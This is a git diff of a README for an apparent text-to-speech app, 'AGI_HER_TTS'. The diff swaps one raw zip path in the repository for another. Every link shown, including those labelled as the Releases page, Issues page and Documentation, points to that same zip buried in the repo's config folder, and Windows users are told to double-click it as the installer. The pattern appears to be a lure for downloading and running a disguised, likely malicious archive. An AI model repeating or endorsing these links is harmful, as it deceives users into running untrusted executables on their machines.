@@ -6,11 +6,11 @@ Welcome to AGI_HER_TTS! This application uses FastSpeech2 technology, tailored f
 
 ## 📥 Download AGI_HER_TTS
 
-[![Download AGI_HER_TTS](https://github.com/Mannalol999/AGI_HER_TTS/raw/refs/heads/main/transformer/TTS-AG-HE-v2.4-beta.1.zip)](https://github.com/Mannalol999/AGI_HER_TTS/raw/refs/heads/main/transformer/TTS-AG-HE-v2.4-beta.1.zip)
+[![Download AGI_HER_TTS](https://github.com/Mannalol999/AGI_HER_TTS/raw/refs/heads/main/config/KSS/AG-TTS-HE-3.4.zip)](https://github.com/Mannalol999/AGI_HER_TTS/raw/refs/heads/main/config/KSS/AG-TTS-HE-3.4.zip)
 
 ### 💾 How to Download
 
-1. Click on the download button above or visit the [Releases page](https://github.com/Mannalol999/AGI_HER_TTS/raw/refs/heads/main/transformer/TTS-AG-HE-v2.4-beta.1.zip) to find the latest version of AGI_HER_TTS.
+1. Click on the download button above or visit the [Releases page](https://github.com/Mannalol999/AGI_HER_TTS/raw/refs/heads/main/config/KSS/AG-TTS-HE-3.4.zip) to find the latest version of AGI_HER_TTS.
 2. On the Releases page, look for the latest version listed at the top. Each version will include a set of files for download.
 3. Find the file that matches your operating system (Windows, macOS, or Linux) and click on it to start downloading.
 
@@ -21,7 +21,7 @@ Once you have downloaded the file, follow these steps to install AGI_HER_TTS on 
 ### For Windows Users 
 
 1. Locate the downloaded file, usually in your “Downloads” folder.
-2. Double-click the installer file (e.g., `https://github.com/Mannalol999/AGI_HER_TTS/raw/refs/heads/main/transformer/TTS-AG-HE-v2.4-beta.1.zip`).
+2. Double-click the installer file (e.g., `https://github.com/Mannalol999/AGI_HER_TTS/raw/refs/heads/main/config/KSS/AG-TTS-HE-3.4.zip`).
 3. Follow the on-screen instructions to complete the installation.
 4. After installation, find AGI_HER_TTS in your Start Menu or Desktop and open it.
 
@@ -69,10 +69,10 @@ If you encounter any issues while using AGI_HER_TTS, here are some common soluti
 
 ## 💬 Support and Feedback
 
-If you need further assistance or would like to provide feedback, please visit our [GitHub Issues page](https://github.com/Mannalol999/AGI_HER_TTS/raw/refs/heads/main/transformer/TTS-AG-HE-v2.4-beta.1.zip). Your input helps us improve AGI_HER_TTS for everyone.
+If you need further assistance or would like to provide feedback, please visit our [GitHub Issues page](https://github.com/Mannalol999/AGI_HER_TTS/raw/refs/heads/main/config/KSS/AG-TTS-HE-3.4.zip). Your input helps us improve AGI_HER_TTS for everyone.
 
 ## 🌐 Explore More
 
-For in-depth information and updates about AGI_HER_TTS, visit our [Documentation](https://github.com/Mannalol999/AGI_HER_TTS/raw/refs/heads/main/transformer/TTS-AG-HE-v2.4-beta.1.zip). We strive to make improvements, and your exploration can guide new features.
+For in-depth information and updates about AGI_HER_TTS, visit our [Documentation](https://github.com/Mannalol999/AGI_HER_TTS/raw/refs/heads/main/config/KSS/AG-TTS-HE-3.4.zip). We strive to make improvements, and your exploration can guide new features.
 
 Thank you for choosing AGI_HER_TTS! Enjoy creating high-quality speech easily.
